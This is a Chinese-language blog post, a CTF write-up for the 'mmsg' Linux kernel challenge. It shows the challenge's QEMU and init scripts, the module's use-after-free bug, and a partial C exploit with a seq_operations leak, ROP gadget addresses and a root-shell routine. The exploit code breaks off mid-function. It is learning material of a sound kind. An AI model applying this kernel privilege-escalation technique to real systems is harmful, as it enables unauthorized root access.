<!DOCTYPE html>
<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>peekgeek-mmsg - ldrx30</title><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="
做题踩坑实录，赛后复现.
" />
	<meta property="og:image" content=""/>
	<meta property="og:title" content="peekgeek-mmsg" />
<meta property="og:description" content="
做题踩坑实录，赛后复现.
" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/posts/peekgeek-mmsg/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-07-28T00:00:00+00:00" />
<meta property="article:modified_time" content="2023-07-28T00:00:00+00:00" />
<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="peekgeek-mmsg"/>
<meta name="twitter:description" content="
做题踩坑实录，赛后复现.
"/>
<script src="http://localhost:1313/js/feather.min.js"></script>
	
	
        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
	

	
	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.5cebd7d4fb2b97856af8d32a6def16164fcf7d844e98e236fcb3559655020373.css" />
		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="http://localhost:1313/css/dark.d22e2a2879d933a4b781535fc4c4c716e9f9d35ea4986dd0cbabda82effc4bdd.css"  disabled />
	

	
	
		<script type="text/javascript"
		src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
		</script>

		
		<script type="text/x-mathjax-config">
		MathJax.Hub.Config({
			tex2jax: {
				inlineMath: [['$','$'], ['\\(','\\)']],
				displayMath: [['$$','$$'], ['\[','\]']],
				processEscapes: true,
				processEnvironments: true,
				skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
				TeX: { equationNumbers: { autoNumber: "AMS" },
						 extensions: ["AMSmath.js", "AMSsymbols.js"] }
			}
		});
		</script>
	

	
	
		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>

		
		<script>
			document.addEventListener("DOMContentLoaded", function() {
					renderMathInElement(document.body, {
							delimiters: [
									{left: "$$", right: "$$", display: true},
									{left: "$", right: "$", display: false}
							]
					});
			});
			</script>
	

	
</head>
<body>
        <div class="content"><header>
	<div class="main">
		<a href="http://localhost:1313/">ldrx30</a>
	</div>
	<nav>
		
		<a href="/">Home</a>
		
		<a href="/posts">All posts</a>
		
		<a href="/about">About</a>
		
		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
		<script src="http://localhost:1313/js/themetoggle.js"></script>
		
	</nav>
</header>

<main>
	<article>
		<div class="title">
			<h1 class="title">peekgeek-mmsg</h1>
			<div class="meta">Posted on Jul 28, 2023</div>
		</div>
		

		

		<section class="body">
			<blockquote>
<p>做题踩坑实录，赛后复现.</p>
</blockquote>
<h2 id="step1-init">step1: init</h2>
<p>拿到附件，查看启动脚本，smep, smap, kaslr，应该还有pti</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>qemu-system-x86_64 <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>        -m 256M <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>        -cpu host,+smep,+smap <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>        -smp <span style="color:#8be9fd;font-style:italic">cores</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span> <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>        -kernel bzImage <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>        -hda rootfs.img <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>        -nographic <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>        -monitor none <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>        -snapshot <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>        -enable-kvm <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>        -append <span style="color:#f1fa8c">&#34;console=ttyS0 root=/dev/sda rw kaslr rdinit=/sbin/init  quiet oops=panic panic=1&#34;</span> <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>        -no-reboot
</span></span></code></pre></div><p>ext4 镜像挂载</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkdir rootfs
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sudo mount rootfs.img ./rootfs
</span></span></code></pre></div><p>查看init， etc/init.d 下的文件</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">#!/bin/sh
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>chown -R root:root /
</span></span><span style="display:flex;"><span>chmod <span style="color:#bd93f9">700</span> /root
</span></span><span style="display:flex;"><span>chown -R ctf:ctf /home/ctf
</span></span><span style="display:flex;"><span>chown root:root /root/flag
</span></span><span style="display:flex;"><span>chmod <span style="color:#bd93f9">600</span> /root/flag
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>mount -t proc none /proc
</span></span><span style="display:flex;"><span>mount -t sysfs none /sys
</span></span><span style="display:flex;"><span>mount -t tmpfs tmpfs /tmp
</span></span><span style="display:flex;"><span>mkdir /dev/pts
</span></span><span style="display:flex;"><span>mount -t devpts devpts /dev/pts
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># echo 1 &gt; /proc/sys/kernel/kptr_restrict</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>insmod /root/mmsg.ko
</span></span><span style="display:flex;"><span>chmod <span style="color:#bd93f9">666</span> /dev/mmsg
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">echo</span> -e <span style="color:#f1fa8c">&#34;\nBoot took </span><span style="color:#ff79c6">$(</span>cut -d<span style="color:#f1fa8c">&#39; &#39;</span> -f1 /proc/uptime<span style="color:#ff79c6">)</span><span style="color:#f1fa8c"> seconds\n&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">cd</span> /home/ctf
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># setsid cttyhack su ctf -c /bin/sh</span>
</span></span><span style="display:flex;"><span>setsid cttyhack setuidgid <span style="color:#bd93f9">1000</span> /bin/sh
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># setsid cttyhack setuidgid 0 /bin/sh</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>poweroff -d <span style="color:#bd93f9">0</span>  -f
</span></span></code></pre></div><p>修改内容，将ko文件拷贝一份，etc/init.d/rcS内容修改一下，然后umount，启动。（修改效果生效必须要<strong>umount</strong>）</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo mount ./rootfs
</span></span></code></pre></div><p>内核版本 <code>5.10.186</code></p>
<h2 id="step2-ko">step2: ko</h2>
<p>逆向分析ko文件（直接给出了c文件，也可以不看）。漏洞所在的地方，类似入门经典题目<a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/slub/uaf/">kernel UAF - CTF Wiki</a>。但是结构体大小0x20</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff79c6">static</span> <span style="color:#ff79c6">struct</span> mmsg_head <span style="color:#ff79c6">*</span>mmsg_head; 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">static</span> <span style="color:#ff79c6">struct</span> miscdevice mmsg_device;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">static</span> <span style="color:#8be9fd">int</span> <span style="color:#50fa7b">module_close</span>(<span style="color:#ff79c6">struct</span> inode <span style="color:#ff79c6">*</span>inode, <span style="color:#ff79c6">struct</span> file <span style="color:#ff79c6">*</span>file) {
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">kfree</span>(mmsg_head);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> SUCCESS;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">static</span> <span style="color:#8be9fd">int</span> __init <span style="color:#50fa7b">mmsg_module_init</span>(<span style="color:#8be9fd">void</span>) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    mmsg_device.minor <span style="color:#ff79c6">=</span> MISC_DYNAMIC_MINOR;
</span></span><span style="display:flex;"><span>    mmsg_device.name <span style="color:#ff79c6">=</span> DEVICE_NAME;
</span></span><span style="display:flex;"><span>    mmsg_device.fops <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>module_fops;
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">misc_register</span>(<span style="color:#ff79c6">&amp;</span>mmsg_device);
</span></span><span style="display:flex;"><span>    mmsg_head <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">kmalloc</span>(<span style="color:#ff79c6">sizeof</span>(<span style="color:#ff79c6">struct</span> mmsg_head), GFP_KERNEL);
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">strncpy</span>(mmsg_head<span style="color:#ff79c6">-&gt;</span>description, DEVICE_NAME <span style="color:#f1fa8c">&#34;-mmsg_head&#34;</span>, <span style="color:#bd93f9">15</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">INIT_LIST_HEAD</span>(<span style="color:#ff79c6">&amp;</span>mmsg_head<span style="color:#ff79c6">-&gt;</span>list);
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">printk</span>(KERN_INFO <span style="color:#f1fa8c">&#34;Hello, World!</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> SUCCESS;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">static</span> <span style="color:#8be9fd">void</span> __exit <span style="color:#50fa7b">mmsg_module_exit</span>(<span style="color:#8be9fd">void</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">misc_deregister</span>(<span style="color:#ff79c6">&amp;</span>mmsg_device);
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">printk</span>(KERN_INFO <span style="color:#f1fa8c">&#34;Goodbye, World!</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="step3-exploit">step3: exploit</h2>
<p>尝试ROP，但是不太会🤡</p>
<h3 id="1">1</h3>
<p>原文内容： <a href="https://n.ova.moe/blog/2023/03/18/_%E5%86%85%E6%A0%B8%E9%A2%98%E7%9B%AE%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95">「PWN」内核 PWN 题目的第一次尝试</a></p>
<ul>
<li>像，很像呀。看了一下，发现及其类似，于是尝试使用类似的exp进行做</li>
<li>调试，找地址，先关闭kaslr，通过泄露获得offset</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#6272a4">/*
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> *  gcc exp.c -static -o exp
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> */</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;fcntl.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;string.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdint.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;assert.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;signal.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;unistd.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;linux/fs.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/ioctl.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/types.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/stat.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/mman.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> fd1, fd2;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> seq_fd;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">size_t</span> buf[<span style="color:#bd93f9">4</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>dev_name <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;/dev/mmsg&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// kernel base =&gt;  cat /proc/kallsyms | grep startup_64
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd">size_t</span> kernel_base;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">size_t</span> kernel_offset;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// nokalr kernel base
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd">size_t</span> nokaslr <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffff81000000</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">/*
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * cat /sys/module/mmsg/sections/.text
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * 0xffffffffc03f5000
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// close kaslr
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// grep prepare_kernel_cred  /proc/kallsyms
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd">size_t</span> prepare_kernel_cred <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffff9248d790</span>;
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// grep commit_creds  /proc/kallsyms
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd">size_t</span> commit_creds <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffff9248d350</span>;
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// grep swapgs_restore_regs_and_return_to_usermode  /proc/kallsyms
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd">size_t</span> swapgs_restore_regs_and_return_to_usermode <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffff93000e30</span>;
</span></span><span style="display:flex;"><span><span style="color:#6272a4">//  grep native_write_cr4 /proc/kallsyms
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd">size_t</span> native_write_cr4 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffffa8832250</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// ropper
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// pop rdi; ret
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd">size_t</span> pop_rdi_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffff812274dd</span>;
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// 0xffffffff82d63c0d: mov edi, eax; call rbx;
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// 在 64 位环境下，目的寄存器若是 32 位，则会将高 32 位清零
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd">size_t</span> mov_edi_eax_call_rbx <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffff82d63c0d</span>;
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// 0xffffffff82e6f708: pop rbx; ret; 
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd">size_t</span> pop_rbx_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffff82e6f708</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> mmsg_arg {
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> token;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> top;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> size;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>data;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">new</span>() {}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">delete</span>() {}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">recv_mmsg</span>() {}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">copy_mmsg</span>() {}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">put_mmsg</span>(<span style="color:#8be9fd">int</span> fd, <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>addr) {
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">struct</span> mmsg_arg arg;
</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">memset</span>(<span style="color:#ff79c6">&amp;</span>arg, <span style="color:#bd93f9">0</span>, <span style="color:#ff79c6">sizeof</span>(<span style="color:#ff79c6">struct</span> mmsg_arg));
</span></span><span style="display:flex;"><span>  arg.data <span style="color:#ff79c6">=</span> addr;
</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">ioctl</span>(fd, <span style="color:#bd93f9">0x5555555</span>, <span style="color:#ff79c6">&amp;</span>arg);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">get_mmsg</span>(<span style="color:#8be9fd">int</span> fd) {
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">struct</span> mmsg_arg arg;
</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">memset</span>(<span style="color:#ff79c6">&amp;</span>arg, <span style="color:#bd93f9">0</span>, <span style="color:#ff79c6">sizeof</span>(<span style="color:#ff79c6">struct</span> mmsg_arg));
</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">memset</span>(buf, <span style="color:#bd93f9">0</span>, <span style="color:#ff79c6">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>  arg.data <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)buf;
</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">ioctl</span>(fd, <span style="color:#bd93f9">0x6666666</span>, <span style="color:#ff79c6">&amp;</span>arg);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">err_exit</span>(<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>msg)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[31m</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[1m[x] Error at: </span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[0m%s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, msg);
</span></span><span style="display:flex;"><span> <span style="color:#50fa7b">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">uint64_t</span> user_cs, user_ss, user_rflags, user_rsp;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">save_status</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> <span style="color:#ff79c6">asm</span>(
</span></span><span style="display:flex;"><span>   <span style="color:#f1fa8c">&#34;movq %%cs, %0;&#34;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#f1fa8c">&#34;movq %%ss, %1;&#34;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#f1fa8c">&#34;movq %%rsp, %3;&#34;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#f1fa8c">&#34;pushfq;&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;pop %2;&#34;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;=r&#34;</span>(user_cs),<span style="color:#f1fa8c">&#34;=r&#34;</span>(user_ss),<span style="color:#f1fa8c">&#34;=r&#34;</span>(user_rflags),<span style="color:#f1fa8c">&#34;=r&#34;</span>(user_rsp)
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">:</span> 
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;memory&#34;</span>
</span></span><span style="display:flex;"><span>   );
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">get_shell</span>(<span style="color:#8be9fd">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> <span style="color:#ff79c6">if</span>( <span style="color:#50fa7b">getuid</span>() ) {
</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">err_exit</span>(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[31m</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[1m[x] Failed to get the root!</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[0m&#34;</span>);
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> <span style="color:#50fa7b">puts</span>(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[32m</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[1m[+] Successful to get the root. </span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[0m&#34;</span>);
</span></span><span style="display:flex;"><span> <span style="color:#50fa7b">system</span>(<span style="color:#f1fa8c">&#34;/bin/sh&#34;</span>);
</span></span><span style="display:flex;"><span> <span style="color:#50fa7b">exit</span>(<span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">seq_open</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> <span style="color:#8be9fd">int</span> seq;
</span></span><span style="display:flex;"><span> <span style="color:#ff79c6">if</span> ( (seq<span style="color:#ff79c6">=</span><span style="color:#50fa7b">open</span>(<span style="color:#f1fa8c">&#34;/proc/self/stat&#34;</span>, O_RDONLY)) <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">err_exit</span>(<span style="color:#f1fa8c">&#34;[x] seq open fail&#34;</span>);
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> <span style="color:#ff79c6">return</span> seq;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">uaf</span>() {
</span></span><span style="display:flex;"><span>    fd1 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">open</span>(dev_name, O_RDWR);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (fd1 <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#50fa7b">err_exit</span>(<span style="color:#f1fa8c">&#34;[x] open device 1&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    fd2 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">open</span>(dev_name, O_RDWR);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (fd2 <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#50fa7b">err_exit</span>(<span style="color:#f1fa8c">&#34;[x] open device 2&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">close</span>(fd1);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">leak_base</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// read 操作，经过函数调用链则会最终调用 seq_operations-&gt;start 指针对应的函数
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    seq_fd <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">seq_open</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">get_mmsg</span>(fd2);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> j <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; j <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">4</span>; j<span style="color:#ff79c6">++</span>) {
